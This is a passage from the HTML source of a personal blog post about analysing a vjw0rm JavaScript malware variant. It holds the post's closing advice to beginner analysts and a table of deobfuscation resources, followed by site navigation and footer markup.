+<p>Secondly, don&rsquo;t beat yourself up unnecesarily just cause you &ldquo;haven&rsquo;t  had experience with running JavaScript code&rdquo; or &ldquo;I must be a terrible analyst cause I didn&rsquo;t <em>immediately</em> identify how to deobfuscate this sample&rdquo;. So what? Who cares, <em>you do now</em>. This technical report serves as evidence of that fact and working through your frustration has made you better for it.</p>
+<p>Thirdly, <em>look</em> and I mean <em>really look</em> at the obfuscated script in its entirety. Don&rsquo;t discount your hunches and make sure that, while you are analysing, you write down all of your leads so that you an explore them in full.</p>
+<h2 class="relative group">Resources 
+    <div id="resources" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#resources" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<p>Throughout this analysis, I found the following resources very useful.</p>
+<table>
+<thead>
+<tr>
+<th>Article</th>
+<th>Description</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><a href="https://lifars.com/wp-content/uploads/2021/09/Vjw0rm-.pdf"   target="_blank">
+    LIFARS Analysis of vjWorm</a></td>
+<td>Analysis of an older variant of vjw0rm, they talk through the steps they took to get rid of the obfuscated layers. A complete sample of the worm.</td>
+<td>Great alternative method for deobfuscating JS</td>
+</tr>
+<tr>
+<td><a href="https://c3rb3ru5d3d53c.github.io/documents/deobfuscating-scripts/"   target="_blank">
+    Malware Hell - Deobfuscating Scripts</a></td>
+<td>How to deobfuscate various script types commonly used by malware</td>
+<td>Provided a good approach to deobfuscation of JS for my brain in particular. Talked through console.log and some com object stuff that really got me thinking</td>
+</tr>
+</tbody>
+</table>
+
+        </div>
+                
+        
+
+        
+  
+  <section class="flex flex-row flex-wrap justify-center pt-4 text-xl">
+    
+      
+      <a
+      target="_blank"
+      class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
+      href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://polaryse.github.io/blog-posts/vjw0rm/&amp;title=Starting%20Small:%20Analysis%20of%20recent%20vjw0rm%20variant"
+      title="Share on LinkedIn"
+      aria-label="Share on LinkedIn"
+      >
+      
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"/></svg>
+
+  </span>
+
+
+    </a>
+      
+    
+      
+      <a
+      target="_blank"
+      class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
+      href="https://twitter.com/intent/tweet/?url=https://polaryse.github.io/blog-posts/vjw0rm/&amp;text=Starting%20Small:%20Analysis%20of%20recent%20vjw0rm%20variant"
+      title="Tweet on Twitter"
+      aria-label="Tweet on Twitter"
+      >
+      
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M389.2 48h70.6L305.6 224.2 487 464H345L233.7 318.6 106.5 464H35.8L200.7 275.5 26.8 48H172.4L272.9 180.9 389.2 48zM364.4 421.8h39.1L151.1 88h-42L364.4 421.8z"/></svg>
+  </span>
+
+
+    </a>
+      
+    
+      
+      <a
+      target="_blank"
+      class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
+      href="https://api.whatsapp.com/send?text=https://polaryse.github.io/blog-posts/vjw0rm/&amp;resubmit=true&amp;title=Starting%20Small:%20Analysis%20of%20recent%20vjw0rm%20variant"
+      title=""
+      aria-label=""
+      >
+      
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M380.9 97.1C339 55.1 283.2 32 223.9 32c-122.4 0-222 99.6-222 222 0 39.1 10.2 77.3 29.6 111L0 480l117.7-30.9c32.4 17.7 68.9 27 106.1 27h.1c122.3 0 224.1-99.6 224.1-222 0-59.3-25.2-115-67.1-157zm-157 341.6c-33.2 0-65.7-8.9-94-25.7l-6.7-4-69.8 18.3L72 359.2l-4.4-7c-18.5-29.4-28.2-63.3-28.2-98.2 0-101.7 82.8-184.5 184.6-184.5 49.3 0 95.6 19.2 130.4 54.1 34.8 34.9 56.2 81.2 56.1 130.5 0 101.8-84.9 184.6-186.6 184.6zm101.2-138.2c-5.5-2.8-32.8-16.2-37.9-18-5.1-1.9-8.8-2.8-12.5 2.8-3.7 5.6-14.3 18-17.6 21.8-3.2 3.7-6.5 4.2-12 1.4-32.6-16.3-54-29.1-75.5-66-5.7-9.8 5.7-9.1 16.3-30.3 1.8-3.7.9-6.9-.5-9.7-1.4-2.8-12.5-30.1-17.1-41.2-4.5-10.8-9.1-9.3-12.5-9.5-3.2-.2-6.9-.2-10.6-.2-3.7 0-9.7 1.4-14.8 6.9-5.1 5.6-19.4 19-19.4 46.3 0 27.3 19.9 53.7 22.6 57.4 2.8 3.7 39.1 59.7 94.8 83.8 35.2 15.2 49 16.5 66.6 13.9 10.7-1.6 32.8-13.4 37.4-26.4 4.6-13 4.6-24.1 3.2-26.4-1.3-2.5-5-3.9-10.5-6.6z"/></svg>
+
+  </span>
+
+
+    </a>
+      
+    
+      
+      <a
+      target="_blank"
+      class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
+      href="https://pinterest.com/pin/create/bookmarklet/?url=https://polaryse.github.io/blog-posts/vjw0rm/&amp;description=Starting%20Small:%20Analysis%20of%20recent%20vjw0rm%20variant"
+      title="Pin on Pinterest"
+      aria-label="Pin on Pinterest"
+      >
+      
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M496 256c0 137-111 248-248 248-25.6 0-50.2-3.9-73.4-11.1 10.1-16.5 25.2-43.5 30.8-65 3-11.6 15.4-59 15.4-59 8.1 15.4 31.7 28.5 56.8 28.5 74.8 0 128.7-68.8 128.7-154.3 0-81.9-66.9-143.2-152.9-143.2-107 0-163.9 71.8-163.9 150.1 0 36.4 19.4 81.7 50.3 96.1 4.7 2.2 7.2 1.2 8.3-3.3.8-3.4 5-20.3 6.9-28.1.6-2.5.3-4.7-1.7-7.1-10.1-12.5-18.3-35.3-18.3-56.6 0-54.7 41.4-107.6 112-107.6 60.9 0 103.6 41.5 103.6 100.9 0 67.1-33.9 113.6-78 113.6-24.3 0-42.6-20.1-36.7-44.8 7-29.5 20.5-61.3 20.5-82.6 0-19-10.2-34.9-31.4-34.9-24.9 0-44.9 25.7-44.9 60.2 0 22 7.4 36.8 7.4 36.8s-24.5 103.8-29 123.2c-5 21.4-3 51.6-.9 71.2C65.4 450.9 0 361.1 0 256 0 119 111 8 248 8s248 111 248 248z"/></svg>
+
+  </span>
+
+
+    </a>
+      
+    
+      
+      <a
+      target="_blank"
+      class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
+      href="https://reddit.com/submit/?url=https://polaryse.github.io/blog-posts/vjw0rm/&amp;resubmit=true&amp;title=Starting%20Small:%20Analysis%20of%20recent%20vjw0rm%20variant"
+      title="Submit to Reddit"
+      aria-label="Submit to Reddit"
+      >
+      
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M201.5 305.5c-13.8 0-24.9-11.1-24.9-24.6 0-13.8 11.1-24.9 24.9-24.9 13.6 0 24.6 11.1 24.6 24.9 0 13.6-11.1 24.6-24.6 24.6zM504 256c0 137-111 248-248 248S8 393 8 256 119 8 256 8s248 111 248 248zm-132.3-41.2c-9.4 0-17.7 3.9-23.8 10-22.4-15.5-52.6-25.5-86.1-26.6l17.4-78.3 55.4 12.5c0 13.6 11.1 24.6 24.6 24.6 13.8 0 24.9-11.3 24.9-24.9s-11.1-24.9-24.9-24.9c-9.7 0-18 5.8-22.1 13.8l-61.2-13.6c-3-.8-6.1 1.4-6.9 4.4l-19.1 86.4c-33.2 1.4-63.1 11.3-85.5 26.8-6.1-6.4-14.7-10.2-24.1-10.2-34.9 0-46.3 46.9-14.4 62.8-1.1 5-1.7 10.2-1.7 15.5 0 52.6 59.2 95.2 132 95.2 73.1 0 132.3-42.6 132.3-95.2 0-5.3-.6-10.8-1.9-15.8 31.3-16 19.8-62.5-14.9-62.5zM302.8 331c-18.2 18.2-76.1 17.9-93.6 0-2.2-2.2-6.1-2.2-8.3 0-2.5 2.5-2.5 6.4 0 8.6 22.8 22.8 87.3 22.8 110.2 0 2.5-2.2 2.5-6.1 0-8.6-2.2-2.2-6.1-2.2-8.3 0zm7.7-75c-13.6 0-24.6 11.1-24.6 24.9 0 13.6 11.1 24.6 24.6 24.6 13.8 0 24.9-11.1 24.9-24.6 0-13.8-11-24.9-24.9-24.9z"/></svg>
+
+  </span>
+
+
+    </a>
+      
+    
+      
+      <a
+      target="_blank"
+      class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
+      href="https://www.facebook.com/sharer/sharer.php?u=https://polaryse.github.io/blog-posts/vjw0rm/&amp;quote=Starting%20Small:%20Analysis%20of%20recent%20vjw0rm%20variant"
+      title="Share on Facebook"
+      aria-label="Share on Facebook"
+      >
+      
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M504 256C504 119 393 8 256 8S8 119 8 256c0 123.78 90.69 226.38 209.25 245V327.69h-63V256h63v-54.64c0-62.15 37-96.48 93.67-96.48 27.14 0 55.52 4.84 55.52 4.84v61h-31.28c-30.8 0-40.41 19.12-40.41 38.73V256h68.78l-11 71.69h-57.78V501C413.31 482.38 504 379.78 504 256z"/></svg>
+
+  </span>
+
+
+    </a>
+      
+    
+      
+      <a
+      target="_blank"
+      class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
+      href="mailto:?body=https://polaryse.github.io/blog-posts/vjw0rm/&amp;subject=Starting%20Small:%20Analysis%20of%20recent%20vjw0rm%20variant"
+      title="Send via email"
+      aria-label="Send via email"
+      >
+      
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M207.8 20.73c-93.45 18.32-168.7 93.66-187 187.1c-27.64 140.9 68.65 266.2 199.1 285.1c19.01 2.888 36.17-12.26 36.17-31.49l.0001-.6631c0-15.74-11.44-28.88-26.84-31.24c-84.35-12.98-149.2-86.13-149.2-174.2c0-102.9 88.61-185.5 193.4-175.4c91.54 8.869 158.6 91.25 158.6 183.2l0 16.16c0 22.09-17.94 40.05-40 40.05s-40.01-17.96-40.01-40.05v-120.1c0-8.847-7.161-16.02-16.01-16.02l-31.98 .0036c-7.299 0-13.2 4.992-15.12 11.68c-24.85-12.15-54.24-16.38-86.06-5.106c-38.75 13.73-68.12 48.91-73.72 89.64c-9.483 69.01 43.81 128 110.9 128c26.44 0 50.43-9.544 69.59-24.88c24 31.3 65.23 48.69 109.4 37.49C465.2 369.3 496 324.1 495.1 277.2V256.3C495.1 107.1 361.2-9.332 207.8 20.73zM239.1 304.3c-26.47 0-48-21.56-48-48.05s21.53-48.05 48-48.05s48 21.56 48 48.05S266.5 304.3 239.1 304.3z"/></svg>
+
+  </span>
+
+
+    </a>
+      
+    
+  </section>
+
+
+          
+      </div>
+     
+    
+     <script>
+        var oid = "views_Blog Posts\/vjw0rm\/index.md"
+        var oid_likes = "likes_Blog Posts\/vjw0rm\/index.md"
+      </script>
+      
+      
+      
+      <script type="text/javascript" src="/js/page.min.5b1bad196a6075a1e11bae1dc95f24f67b610948a00525e347566c5a62338ea78f1c7224ab9a53873dcdb2a1a7d7d391b8a8ef45561297f68806c01315b0c4f6.js" integrity="sha512-WxutGWpgdaHhG64dyV8k9nthCUigBSXjR1ZsWmIzjqePHHIkq5pThz3NsqGn19ORuKjvRVYSl/aIBsATFbDE9g=="></script>
+  
+    </section>
+  <footer class="pt-8 max-w-prose print:hidden">
+
+    
+  
+    
+    
+    
+    <div class="pt-8">
+      <hr class="border-dotted border-neutral-300 dark:border-neutral-600" />
+      <div class="flex justify-between pt-3">
+        <span>
+          
+            <a class="flex group mr-3" href="/blog-posts/introduction/">
+              <span
+                class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
+                >&larr;</span
+              >
+              <span
+                class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400"
+                >&rarr;</span
+              >
+              <span class="flex flex-col">
+                <span
+                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
+                  >An Introduction</span
+                >
+                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
+                  
+                </span>
+              </span>
+            </a>
+          
+        </span>
+        <span>
+          
+            <a class="flex text-right group ml-3" href="/blog-posts/wannasmile/">
+              <span class="flex flex-col">
+                <span
+                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
+                  >You make me WannaSmile</span
+                >
+                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
+                  
+                </span>
+              </span>
+              <span
+                class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
+                >&rarr;</span
+              >
+              <span
+                class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400"
+                >&larr;</span
+              >
+            </a>
+          
+        </span>
+      </div>
+    </div>
+  
+
+
+    
+  </footer>
+</article>
+
+      <div id="top-scroller" class="pointer-events-none absolute top-[110vh] bottom-0 w-12 ltr:right-0 rtl:left-0">
+  <a href="#the-top"
+    class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 mb-16 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
+    aria-label="Scroll to top" title="Scroll to top">
+    &uarr;
+  </a>
+</div>
+    </main><footer id="site-footer" class="py-10 print:hidden">
+  
+  
+    
+    <nav class="flex flex-row pb-4 text-base font-medium text-neutral-500 dark:text-neutral-400">
+      <ul class="flex flex-col list-none sm:flex-row">
+        
+        <li class="flex mb-1 ltr:text-right rtl:text-left sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0">
+          <a class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2 flex items-center" href=""
+            title="">
+            
+            This website has been created for educational porpoises
+          </a>
+        </li>
+        
+      </ul>
+    </nav>
+    
+  
+  <div class="flex items-center justify-between">
+
+    
+    
+    <p class="text-sm text-neutral-500 dark:text-neutral-400">
+      &copy;
+      2024
+      polaryse
+    </p>
+    
+
+    
+    
+    <p class="text-xs text-neutral-500 dark:text-neutral-400">
+      
+      
+      Powered by <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
+        href="https://gohugo.io/" target="_blank" rel="noopener noreferrer">Hugo</a> &amp; <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
+        href="https://blowfish.page/" target="_blank" rel="noopener noreferrer">Blowfish</a>
+    </p>
+    
+
+  </div>
+  <script>
+    
+    mediumZoom(document.querySelectorAll("img:not(.nozoom)"), {
+      margin: 24,
+      background: 'rgba(0,0,0,0.5)',
+      scrollOffset: 0,
+    })
+    
+  </script>
+  
+  
+  <script type="text/javascript" src="/js/process.min.62060bb247f4de2b6dde45903668fefb68d792f365587605177b1227c0cf43588701edaca0cb40e2c8e2789bd5ce67c1d2a215b9fb258c3496a7cd25e7cb5fdf.js" integrity="sha512-YgYLskf03itt3kWQNmj&#43;&#43;2jXkvNlWHYFF3sSJ8DPQ1iHAe2soMtA4sjieJvVzmfB0qIVufsljDSWp80l58tf3w=="></script>
+  
+  
+</footer><div
+  id="search-wrapper"
+  class="invisible fixed inset-0 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh]"
+  data-url="https://polaryse.github.io/"
+  style="z-index:500"
+>
+  <div
+    id="search-modal"
+    class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg top-20 border-neutral-200 bg-neutral dark:border-neutral-700 dark:bg-neutral-800"
+  >
+    <header class="relative z-10 flex items-center justify-between flex-none px-2">
+      <form class="flex items-center flex-auto min-w-0">
+        <div class="flex items-center justify-center w-8 h-8 text-neutral-400">
+          
+
+  <span class="relative block icon">
+    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+
+  </span>
+
+
+        </div>
+        <input
+          type="search"
+          id="search-query"
+          class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-2 focus:outline-transparent"
+          placeholder="Search"
+          tabindex="0"
+        />
+      </form>
+      <button
+        id="close-search-button"
+        class="flex items-center justify-center w-8 h-8 text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
+        title="Close (Esc)"
+      >
+        
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+
+  </span>
+
+
+      </button>
+    </header>
+    <section class="flex-auto px-2 overflow-auto">
+      <ul id="search-results">
+        
+      </ul>
+    </section>
+  </div>
+</div>
+
+  </div>
+</body>
+
+</html>
